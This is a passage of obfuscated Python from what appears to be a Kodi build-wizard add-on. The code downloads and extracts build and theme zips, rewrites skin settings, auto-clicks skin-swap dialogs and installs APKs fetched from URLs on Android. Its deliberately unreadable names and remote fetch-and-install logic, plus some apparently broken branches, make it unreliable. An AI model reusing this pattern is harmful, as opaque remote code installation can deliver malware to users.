				wiz .setS ('buildversion',wiz .checkBuild (OO00000000OO00OOO ,'version'))#line:3776
				wiz .setS ('buildtheme','')#line:3777
				wiz .setS ('latestversion',wiz .checkBuild (OO00000000OO00OOO ,'version'))#line:3778
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:3779
				wiz .setS ('installed','true')#line:3780
				wiz .setS ('extract',str (O0OOO000OOO0O00O0 ))#line:3781
				wiz .setS ('errors',str (O0OOO0OO0O0OO0OOO ))#line:3782
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O0OOO000OOO0O00O0 ,O0OOO0OO0O0OO0OOO ))#line:3783
				OO0OO0000O0OO0O0O =(ADDON .getSetting ("gaiaseren"))#line:3785
				if OO0OO0000O0OO0O0O =='true':#line:3786
					wiz .kodi17Fix ()#line:3787
				fastupdatefirstbuild (NOTEID )#line:3788
				skin_homeselect ()#line:3789
				skin_lower ()#line:3790
				rdbuildinstall ()#line:3791
				try :gaiaserenaddon ()#line:3793
				except :pass #line:3794
				adults18 ()#line:3795
				skinfix18 ()#line:3796
				try :os .remove (OO0OO00OO00O00000 )#line:3798
				except :pass #line:3799
				if OO0OO0000O0OO0O0O =='true':#line:3801
					wiz .kodi17Fix ()#line:3802
				if int (float (O0OOO0OO0O0OO0OOO ))>0 :#line:3804
					O000OO0OO0O00O0O0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00000000OO00OOO ,wiz .checkBuild (OO00000000OO00OOO ,'version')),'הושלם: [COLOR %s]%s%s[/COLOR] [שגיאות:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O0OOO000OOO0O00O0 ,'%',COLOR1 ,O0OOO0OO0O0OO0OOO ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:3805
					if O000OO0OO0O00O0O0 :#line:3806
						if isinstance (O0OOO0OO0O0OO0OOO ,unicode ):#line:3807
							OO0O0OOO0OOOO00O0 =OO0O0OOO0OOOO00O0 .encode ('utf-8')#line:3808
						wiz .TextBox (ADDONTITLE ,OO0O0OOO0OOOO00O0 )#line:3809
				DP .close ()#line:3810
				OO0OO0OOOO00OOO0O =wiz .themeCount (OO00000000OO00OOO )#line:3811
				indicator ()#line:3812
				if not OO0OO0OOOO00OOO0O ==False :#line:3813
					buildWizard (OO00000000OO00OOO ,'theme')#line:3814
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:3815
				if INSTALLMETHOD ==1 :O00O0O0OOO0OOOOO0 =1 #line:3816
				elif INSTALLMETHOD ==2 :O00O0O0OOO0OOOOO0 =0 #line:3817
				else :resetkodi ()#line:3818
				if O00O0O0OOO0OOOOO0 ==1 :wiz .reloadFix ()#line:3820
				else :wiz .killxbmc (True )#line:3821
			else :#line:3822
				if isinstance (O0OOO0OO0O0OO0OOO ,unicode ):#line:3823
					OO0O0OOO0OOOO00O0 =OO0O0OOO0OOOO00O0 .encode ('utf-8')#line:3824
				OOOOO00OO0OO00000 =open (OO0OO00OO00O00000 ,'r')#line:3825
				O000OO00O0O000OO0 =OOOOO00OO0OO00000 .read ()#line:3826
				OO00OO0OOO0O0000O =''#line:3827
				for OO0OO0OO00O0OOOO0 in O0O00000OO0O00OOO :#line:3828
				  OO00OO0OOO0O0000O ='key: '+OO00OO0OOO0O0000O +'\n'+OO0OO0OO00O0OOOO0 #line:3829
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,OO0O0OOO0OOOO00O0 +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+OO00OO0OOO0O0000O )#line:3830
		else :#line:3831
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:3832
	elif O000OO0O0O0O000O0 =='theme':#line:3833
		if theme ==None :#line:3834
			OO0OO0OOOO00OOO0O =wiz .checkBuild (OO00000000OO00OOO ,'theme')#line:3835
			O0O0OOO0O0OOOO0O0 =[]#line:3836
			if not OO0OO0OOOO00OOO0O =='http://'and wiz .workingURL (OO0OO0OOOO00OOO0O )==True :#line:3837
				O0O0OOO0O0OOOO0O0 =wiz .themeCount (OO00000000OO00OOO ,False )#line:3838
				if len (O0O0OOO0O0OOOO0O0 )>0 :#line:3839
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,OO00000000OO00OOO ,COLOR1 ,len (O0O0OOO0O0OOOO0O0 )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:3840
						wiz .log ("Theme List: %s "%str (O0O0OOO0O0OOOO0O0 ))#line:3841
						O0O00000O00OO0000 =DIALOG .select (ADDONTITLE ,O0O0OOO0O0OOOO0O0 )#line:3842
						wiz .log ("Theme install selected: %s"%O0O00000O00OO0000 )#line:3843
						if not O0O00000O00OO0000 ==-1 :theme =O0O0OOO0O0OOOO0O0 [O0O00000O00OO0000 ];O00OO0OOOOOOO00OO =True #line:3844
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:3845
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:3846
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:3847
		else :O00OO0OOOOOOO00OO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,OO00000000OO00OOO ,wiz .checkBuild (OO00000000OO00OOO ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:3848
		if O00OO0OOOOOOO00OO :#line:3849
			O0000000O0O0O0OO0 =wiz .checkTheme (OO00000000OO00OOO ,theme ,'url')#line:3850
			OO0OOO0O0000O0OO0 =OO00000000OO00OOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3851
			if not wiz .workingURL (O0000000O0O0O0OO0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:3852
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3853
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:3854
			OO0OO00OO00O00000 =os .path .join (PACKAGES ,'%s.zip'%OO0OOO0O0000O0OO0 )#line:3855
			try :os .remove (OO0OO00OO00O00000 )#line:3856
			except :pass #line:3857
			downloader .download (O0000000O0O0O0OO0 ,OO0OO00OO00O00000 ,DP )#line:3858
			xbmc .sleep (1000 )#line:3859
			DP .update (0 ,"","Installing %s "%OO00000000OO00OOO )#line:3860
			O0OOOO00OO0O0OOOO =False #line:3861
			if url not in ["fresh","normal"]:#line:3862
				O0OOOO00OO0O0OOOO =testTheme (OO0OO00OO00O00000 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:3863
				O0OOOOOOOO0O0000O =testGui (OO0OO00OO00O00000 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:3864
				if O0OOOO00OO0O0OOOO ==True :#line:3865
					wiz .lookandFeelData ('save')#line:3866
					O00O00O00O0OO00OO ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:3867
					O00OOO0OO0O0OO0OO =xbmc .getSkinDir ()#line:3868
					skinSwitch .swapSkins (O00O00O00O0OO00OO )#line:3870
					O00O0OOOOOO000OO0 =0 #line:3871
					xbmc .sleep (1000 )#line:3872
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00O0OOOOOO000OO0 <150 :#line:3873
						O00O0OOOOOO000OO0 +=1 #line:3874
						xbmc .sleep (1000 )#line:3875
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3876
						wiz .ebi ('SendClick(11)')#line:3877
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:3878
					xbmc .sleep (1000 )#line:3879
			O0O0O0OOOO0O000O0 ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:3880
			DP .update (0 ,O0O0O0OOOO0O000O0 ,'','אנא המתן')#line:3881
			O0OOO000OOO0O00O0 ,O0OOO0OO0O0OO0OOO ,OO0O0OOO0OOOO00O0 =extract .all (OO0OO00OO00O00000 ,HOME ,DP ,title =O0O0O0OOOO0O000O0 )#line:3882
			wiz .setS ('buildtheme',theme )#line:3883
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(O0OOO000OOO0O00O0 ,O0OOO0OO0O0OO0OOO ))#line:3884
			DP .close ()#line:3885
			if url not in ["fresh","normal"]:#line:3886
				wiz .forceUpdate ()#line:3887
				if KODIV >=17 :wiz .kodi17Fix ()#line:3888
				if O0OOOOOOOO0O0000O ==True :#line:3889
					wiz .lookandFeelData ('save')#line:3890
					wiz .defaultSkin ()#line:3891
					O00OOO0OO0O0OO0OO =wiz .getS ('defaultskin')#line:3892
					skinSwitch .swapSkins (O00OOO0OO0O0OO0OO )#line:3893
					O00O0OOOOOO000OO0 =0 #line:3894
					xbmc .sleep (1000 )#line:3895
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00O0OOOOOO000OO0 <150 :#line:3896
						O00O0OOOOOO000OO0 +=1 #line:3897
						xbmc .sleep (1000 )#line:3898
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3900
						wiz .ebi ('SendClick(11)')#line:3901
					wiz .lookandFeelData ('restore')#line:3902
				elif O0OOOO00OO0O0OOOO ==True :#line:3903
					skinSwitch .swapSkins (O00OOO0OO0O0OO0OO )#line:3904
					O00O0OOOOOO000OO0 =0 #line:3905
					xbmc .sleep (1000 )#line:3906
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00O0OOOOOO000OO0 <150 :#line:3907
						O00O0OOOOOO000OO0 +=1 #line:3908
						xbmc .sleep (1000 )#line:3909
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3911
						wiz .ebi ('SendClick(11)')#line:3912
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:3913
					wiz .lookandFeelData ('restore')#line:3914
				else :#line:3915
					wiz .ebi ("ReloadSkin()")#line:3916
					xbmc .sleep (1000 )#line:3917
					wiz .ebi ("Container.Refresh")#line:3918
		else :#line:3919
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:3920
def skin_homeselect ():#line:3924
	try :#line:3926
		O000O0O0O00O0O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3927
		O000OOO0O00O0O0OO =open (O000O0O0O00O0O000 ,'r')#line:3929
		O0OOOO000000O00OO =O000OOO0O00O0O0OO .read ()#line:3930
		O000OOO0O00O0O0OO .close ()#line:3931
		O0O0O0000000OO00O ='<setting id="HomeS" type="string(.+?)/setting>'#line:3932
		O0OOO0O0O0O0OOOOO =re .compile (O0O0O0000000OO00O ).findall (O0OOOO000000O00OO )[0 ]#line:3933
		O000OOO0O00O0O0OO =open (O000O0O0O00O0O000 ,'w')#line:3934
		O000OOO0O00O0O0OO .write (O0OOOO000000O00OO .replace ('<setting id="HomeS" type="string%s/setting>'%O0OOO0O0O0O0OOOOO ,'<setting id="HomeS" type="string"></setting>'))#line:3935
		O000OOO0O00O0O0OO .close ()#line:3936
	except :#line:3937
		pass #line:3938
def skin_lower ():#line:3941
	O0OOOOOO000O0O0OO =(ADDON .getSetting ("lower"))#line:3942
	if O0OOOOOO000O0O0OO =='true':#line:3943
		try :#line:3946
			O000OO0O0O0000000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3947
			OO0000OO00OO00000 =open (O000OO0O0O0000000 ,'r')#line:3949
			O0O0O0OO00O0O0000 =OO0000OO00OO00000 .read ()#line:3950
			OO0000OO00OO00000 .close ()#line:3951
			O0OO00O00O00OOOO0 ='<setting id="none_widget" type="bool(.+?)/setting>'#line:3952
			OOOOOOOO0OO0OO00O =re .compile (O0OO00O00O00OOOO0 ).findall (O0O0O0OO00O0O0000 )[0 ]#line:3953
			OO0000OO00OO00000 =open (O000OO0O0O0000000 ,'w')#line:3954
			OO0000OO00OO00000 .write (O0O0O0OO00O0O0000 .replace ('<setting id="none_widget" type="bool%s/setting>'%OOOOOOOO0OO0OO00O ,'<setting id="none_widget" type="bool">true</setting>'))#line:3955
			OO0000OO00OO00000 .close ()#line:3956
			O000OO0O0O0000000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3958
			OO0000OO00OO00000 =open (O000OO0O0O0000000 ,'r')#line:3960
			O0O0O0OO00O0O0000 =OO0000OO00OO00000 .read ()#line:3961
			OO0000OO00OO00000 .close ()#line:3962
			O0OO00O00O00OOOO0 ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:3963
			OOOOOOOO0OO0OO00O =re .compile (O0OO00O00O00OOOO0 ).findall (O0O0O0OO00O0O0000 )[0 ]#line:3964
			OO0000OO00OO00000 =open (O000OO0O0O0000000 ,'w')#line:3965
			OO0000OO00OO00000 .write (O0O0O0OO00O0O0000 .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%OOOOOOOO0OO0OO00O ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:3966
			OO0000OO00OO00000 .close ()#line:3967
			O000OO0O0O0000000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3969
			OO0000OO00OO00000 =open (O000OO0O0O0000000 ,'r')#line:3971
			O0O0O0OO00O0O0000 =OO0000OO00OO00000 .read ()#line:3972
			OO0000OO00OO00000 .close ()#line:3973
			O0OO00O00O00OOOO0 ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:3974
			OOOOOOOO0OO0OO00O =re .compile (O0OO00O00O00OOOO0 ).findall (O0O0O0OO00O0O0000 )[0 ]#line:3975
			OO0000OO00OO00000 =open (O000OO0O0O0000000 ,'w')#line:3976
			OO0000OO00OO00000 .write (O0O0O0OO00O0O0000 .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%OOOOOOOO0OO0OO00O ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:3977
			OO0000OO00OO00000 .close ()#line:3978
			O000OO0O0O0000000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3982
			OO0000OO00OO00000 =open (O000OO0O0O0000000 ,'r')#line:3984
			O0O0O0OO00O0O0000 =OO0000OO00OO00000 .read ()#line:3985
			OO0000OO00OO00000 .close ()#line:3986
			O0OO00O00O00OOOO0 ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:3987
			OOOOOOOO0OO0OO00O =re .compile (O0OO00O00O00OOOO0 ).findall (O0O0O0OO00O0O0000 )[0 ]#line:3988
			OO0000OO00OO00000 =open (O000OO0O0O0000000 ,'w')#line:3989
			OO0000OO00OO00000 .write (O0O0O0OO00O0O0000 .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%OOOOOOOO0OO0OO00O ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:3990
			OO0000OO00OO00000 .close ()#line:3991
			O000OO0O0O0000000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3995
			OO0000OO00OO00000 =open (O000OO0O0O0000000 ,'r')#line:3997
			O0O0O0OO00O0O0000 =OO0000OO00OO00000 .read ()#line:3998
			OO0000OO00OO00000 .close ()#line:3999
			O0OO00O00O00OOOO0 ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4000
			OOOOOOOO0OO0OO00O =re .compile (O0OO00O00O00OOOO0 ).findall (O0O0O0OO00O0O0000 )[0 ]#line:4001
			OO0000OO00OO00000 =open (O000OO0O0O0000000 ,'w')#line:4002
			OO0000OO00OO00000 .write (O0O0O0OO00O0O0000 .replace ('<setting id="show.cdart" type="bool%s/setting>'%OOOOOOOO0OO0OO00O ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4003
			OO0000OO00OO00000 .close ()#line:4004
			O000OO0O0O0000000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4008
			OO0000OO00OO00000 =open (O000OO0O0O0000000 ,'r')#line:4010
			O0O0O0OO00O0O0000 =OO0000OO00OO00000 .read ()#line:4011
			OO0000OO00OO00000 .close ()#line:4012
			O0OO00O00O00OOOO0 ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4013
			OOOOOOOO0OO0OO00O =re .compile (O0OO00O00O00OOOO0 ).findall (O0O0O0OO00O0O0000 )[0 ]#line:4014
			OO0000OO00OO00000 =open (O000OO0O0O0000000 ,'w')#line:4015
			OO0000OO00OO00000 .write (O0O0O0OO00O0O0000 .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%OOOOOOOO0OO0OO00O ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4016
			OO0000OO00OO00000 .close ()#line:4017
		except :#line:4022
			pass #line:4023
def thirdPartyInstall (O000OOOOO000000OO ,OO0OO000OOO0O0O0O ):#line:4025
	if not wiz .workingURL (OO0OO000OOO0O0O0O ):#line:4026
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4027
	OO000000O00OOO000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O000OOOOO000000OO ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4028
	if OO000000O00OOO000 ==1 :#line:4029
		freshStart ('third',True )#line:4030
	wiz .clearS ('build')#line:4031
	OO0OOOOOOO0000O00 =O000OOOOO000000OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4032
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4033
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000OOOOO000000OO ),'','אנא המתן')#line:4034
	O0O000O00OOO0O000 =os .path .join (PACKAGES ,'%s.zip'%OO0OOOOOOO0000O00 )#line:4035
	try :os .remove (O0O000O00OOO0O000 )#line:4036
	except :pass #line:4037
	downloader .download (OO0OO000OOO0O0O0O ,O0O000O00OOO0O000 ,DP )#line:4038
	xbmc .sleep (1000 )#line:4039
	OO0O0O0O0O0OO00OO ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000OOOOO000000OO )#line:4040
	DP .update (0 ,OO0O0O0O0O0OO00OO ,'','אנא המתן')#line:4041
	OOOOO0O0O00OO00O0 ,OOOOOO0O0OO0O0000 ,O00OO000000O000O0 =extract .all (O0O000O00OOO0O000 ,HOME ,DP ,title =OO0O0O0O0O0OO00OO )#line:4042
	if int (float (OOOOO0O0O00OO00O0 ))>0 :#line:4043
		wiz .fixmetas ()#line:4044
		wiz .lookandFeelData ('save')#line:4045
		wiz .defaultSkin ()#line:4046
		wiz .setS ('installed','true')#line:4048
		wiz .setS ('extract',str (OOOOO0O0O00OO00O0 ))#line:4049
		wiz .setS ('errors',str (OOOOOO0O0OO0O0000 ))#line:4050
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OOOOO0O0O00OO00O0 ,OOOOOO0O0OO0O0000 ))#line:4051
		try :os .remove (O0O000O00OOO0O000 )#line:4052
		except :pass #line:4053
		if int (float (OOOOOO0O0OO0O0000 ))>0 :#line:4054
			OOO0000OOOOO0O0O0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000OOOOO000000OO ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OOOOO0O0O00OO00O0 ,'%',COLOR1 ,OOOOOO0O0OO0O0000 ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4055
			if OOO0000OOOOO0O0O0 :#line:4056
				if isinstance (OOOOOO0O0OO0O0000 ,unicode ):#line:4057
					O00OO000000O000O0 =O00OO000000O000O0 .encode ('utf-8')#line:4058
				wiz .TextBox (ADDONTITLE ,O00OO000000O000O0 )#line:4059
	DP .close ()#line:4060
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4061
	if INSTALLMETHOD ==1 :OOO0OOOO000O00000 =1 #line:4062
	elif INSTALLMETHOD ==2 :OOO0OOOO000O00000 =0 #line:4063
	else :OOO0OOOO000O00000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4064
	if OOO0OOOO000O00000 ==1 :wiz .reloadFix ()#line:4065
	else :wiz .killxbmc (True )#line:4066
def testTheme (OOOO0OO00OO000OOO ):#line:4068
	O0O000OO00O0OOO00 =zipfile .ZipFile (OOOO0OO00OO000OOO )#line:4069
	for OO0000000OOOOOO00 in O0O000OO00O0OOO00 .infolist ():#line:4070
		if '/settings.xml'in OO0000000OOOOOO00 .filename :#line:4071
			return True #line:4072
	return False #line:4073
def testGui (O00000OOO0OO00OO0 ):#line:4075
	O0OOO0000O00O0000 =zipfile .ZipFile (O00000OOO0OO00OO0 )#line:4076
	for OO00OO0OOOO0O00OO in O0OOO0000O00O0000 .infolist ():#line:4077
		if '/guisettings.xml'in OO00OO0OOOO0O00OO .filename :#line:4078
			return True #line:4079
	return False #line:4080
def apkInstaller (O0OO0OO0O0OOO00O0 ,O0O0000OOO00O000O ):#line:4082
	wiz .log (O0OO0OO0O0OOO00O0 )#line:4083
	wiz .log (O0O0000OOO00O000O )#line:4084
	if wiz .platform ()=='android':#line:4085
		OO00OOO00O0O0OO00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OO0OO0O0OOO00O0 ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4086
		if not OO00OOO00O0O0OO00 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4087
		OOO00O00O0O0000O0 =O0OO0OO0O0OOO00O0 #line:4088
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4089
		if not wiz .workingURL (O0O0000OOO00O000O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4090
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO00O00O0O0000O0 ),'','אנא המתן')#line:4091
		OOO00O00OOOOOOO0O =os .path .join (PACKAGES ,"%s.apk"%O0OO0OO0O0OOO00O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4092
		try :os .remove (OOO00O00OOOOOOO0O )#line:4093
		except :pass #line:4094
		downloader .download (O0O0000OOO00O000O ,OOO00O00OOOOOOO0O ,DP )#line:4095
		xbmc .sleep (100 )#line:4096
		DP .close ()#line:4097
		notify .apkInstaller (O0OO0OO0O0OOO00O0 )#line:4098
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+OOO00O00OOOOOOO0O +'")')#line:4099
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4100
def createMenu (O0O00O0OO00OOO0OO ,O0O0OOO0OO00O0000 ,OO00OO0OO000O00OO ):#line:4106
	if O0O00O0OO00OOO0OO =='saveaddon':#line:4107
		OOO000O000OOOO000 =[]#line:4108
		OO0O0OO0OO00O0O0O =urllib .quote_plus (O0O0OOO0OO00O0000 .lower ().replace (' ',''))#line:4109
		O0OO0OO0O0O0000O0 =O0O0OOO0OO00O0000 .replace ('Debrid','Real Debrid')#line:4110
		O0OOO000O0OO0O00O =urllib .quote_plus (OO00OO0OO000O00OO .lower ().replace (' ',''))#line:4111
		OO00OO0OO000O00OO =OO00OO0OO000O00OO .replace ('url','URL Resolver')#line:4112
		OOO000O000OOOO000 .append ((THEME2 %OO00OO0OO000O00OO .title (),' '))#line:4113
		OOO000O000OOOO000 .append ((THEME3 %'Save %s Data'%O0OO0OO0O0O0000O0 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OO0O0OO0OO00O0O0O ,O0OOO000O0OO0O00O )))#line:4114
		OOO000O000OOOO000 .append ((THEME3 %'Restore %s Data'%O0OO0OO0O0O0000O0 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OO0O0OO0OO00O0O0O ,O0OOO000O0OO0O00O )))#line:4115
		OOO000O000OOOO000 .append ((THEME3 %'Clear %s Data'%O0OO0OO0O0O0000O0 ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,OO0O0OO0OO00O0O0O ,O0OOO000O0OO0O00O )))#line:4116
	elif O0O00O0OO00OOO0OO =='save':#line:4117
		OOO000O000OOOO000 =[]#line:4118
		OO0O0OO0OO00O0O0O =urllib .quote_plus (O0O0OOO0OO00O0000 .lower ().replace (' ',''))#line:4119
		O0OO0OO0O0O0000O0 =O0O0OOO0OO00O0000 .replace ('Debrid','Real Debrid')#line:4120
		O0OOO000O0OO0O00O =urllib .quote_plus (OO00OO0OO000O00OO .lower ().replace (' ',''))#line:4121
		OO00OO0OO000O00OO =OO00OO0OO000O00OO .replace ('url','URL Resolver')#line:4122
		OOO000O000OOOO000 .append ((THEME2 %OO00OO0OO000O00OO .title (),' '))#line:4123
		OOO000O000OOOO000 .append ((THEME3 %'Register %s'%O0OO0OO0O0O0000O0 ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,OO0O0OO0OO00O0O0O ,O0OOO000O0OO0O00O )))#line:4124
		OOO000O000OOOO000 .append ((THEME3 %'Save %s Data'%O0OO0OO0O0O0000O0 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OO0O0OO0OO00O0O0O ,O0OOO000O0OO0O00O )))#line:4125
		OOO000O000OOOO000 .append ((THEME3 %'Restore %s Data'%O0OO0OO0O0O0000O0 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OO0O0OO0OO00O0O0O ,O0OOO000O0OO0O00O )))#line:4126
		OOO000O000OOOO000 .append ((THEME3 %'Import %s Data'%O0OO0OO0O0O0000O0 ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,OO0O0OO0OO00O0O0O ,O0OOO000O0OO0O00O )))#line:4127
